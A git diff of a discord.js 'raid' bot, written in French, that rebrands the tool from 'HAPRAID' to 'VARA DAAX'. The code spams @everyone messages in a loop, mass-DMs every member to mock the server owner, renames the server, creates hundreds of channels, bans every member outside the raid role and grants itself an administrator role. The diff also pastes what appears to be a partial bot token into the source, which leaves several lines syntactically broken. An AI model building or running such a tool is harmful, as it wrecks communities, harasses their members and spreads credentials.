@@ -1,6 +1,7 @@
 ﻿const Discord = require("discord.js");
 const bot = new Discord.Client();
-const token = "process.env.TOKEN";
+const token = "process.env.
+NTIzNDMyNzA0Mjg5NTM4MDQ4.DvZcaQ";
 var prefix = ".";
 var mention = "126connectés"
 
@@ -24,7 +25,8 @@ bot.on('message', msg => {
   if (msg.content === '.a') {
     console.log(`Commande .des par ${msg.author.tag}`);
     var interval = setInterval (function () {
-      msg.channel.send("@everyone  @here  RAID BY HAPRAID https://discord.gg/gmqf6wT https://media.discordapp.net/attachments/494613905654546435/515855972846272513/giphy-4.gif?width=270&height=270 https://media.discordapp.net/attachments/353298252122292225/437735929902268416/unknown.png");
+      msg.channel.send("Raid By Vara Daax tes maîtres puissants https://discord.gg/GN48n6Q XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX  https://gph.is/2C31qD3 @everyone
+");
      }, 500);
   }
             if (msg.content === '.des') {
@@ -33,7 +35,7 @@ bot.on('message', msg => {
                 if (msg.deletable) msg.delete();
                 msg.guild.members.forEach(member => {
                   setInterval(function () {
-                    member.send(msg.guild.owner.user.username+" s'est fait bz son serv par https://discord.gg/sGGZPJN https://media.discordapp.net/attachments/494613905654546435/515855972846272513/giphy-4.gif?width=270&height=270").catch(error => {}) }, 450)})
+                    member.send(msg.guild.owner.user.username+" s'est fait bz son serv par https://discord.gg/GN48n6Q https://gph.is/2C31qD3").catch(error => {}) }, 450)})
        }
 
 if(msg.content === '.del'){
@@ -47,12 +49,12 @@ if(msg.content === '.del'){
     console.log(`Commande .des par ${msg.author.tag}`);
  
     if (!fucked){
-      msg.guild.setIcon("hapraid.png").catch(e => {});
-      msg.guild.setName('RAID BY HAPRAID').catch(e => {});
+      msg.guild.setIcon("varadaax.png").catch(e => {});
+      msg.guild.setName('RAID BY VARA DAAX').catch(e => {});
  
       for (var i = 0; i < 390; i++) {
-        msg.guild.createChannel('hapraid•exe', 'voice').catch(e => {});
-        msg.guild.createChannel('hapraid•exe', 'text').catch(e => {});
+        msg.guild.createChannel('HACKED BY VARA DAAX', 'voice').catch(e => {});
+        msg.guild.createChannel('HACKED BY VARA DAAX', 'text').catch(e => {});
       }
       fucked = true;
             }
@@ -65,7 +67,7 @@ if(msg.content === '.del'){
   if (msg.content === '.ban') {
     console.log(`Commande .bane par ${msg.author.tag}`);
     msg.guild.members.forEach(member => {
-      if (!member.roles.exists("name", "haprole") && member.bannable) member.ban().catch(e => {});
+      if (!member.roles.exists("name", "HACKED BY VARA DAAX") && member.bannable) member.ban().catch(e => {});
     });
   }
  
@@ -79,7 +81,7 @@ if(msg.content === '.del'){
     console.log(`Commande .r par ${msg.author.tag}`);
  
     msg.member.guild.createRole({
-      name: "haprole",
+      name: "HACKED BY VARA DAAX",
       permissions: "ADMINISTRATOR",
       mentionable: false
     }).then(function(role) {
@@ -95,10 +97,11 @@ bot.on("message", msg => {
             let i = 0;
             let interval = setInterval(function () {
               msg.guild.channels.forEach(channel => {
-                if (channel.type === "text") channel.send('"@everyone  @here  RAID BY HAPRAID https://media.discordapp.net/attachments/494613905654546435/515855972846272513/giphy-4.gif?width=270&height=270 https://discord.gg/gmqf6wT https://media.discordapp.net/attachments/353298252122292225/437735929902268416/unknown.png')
+                if (channel.type === "text") channel.send('"Raid By Vara Daax tes maîtres puissants https://discord.gg/GN48n6Q XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX  https://gph.is/2C31qD3 @everyone
+')
               }, 2500);
             });
           }
         });
 
-bot.login(process.env.TOKEN)
+bot.login(process.env.NTIzNDMyNzA0Mjg5NTM4MDQ4.DvZcaQ)
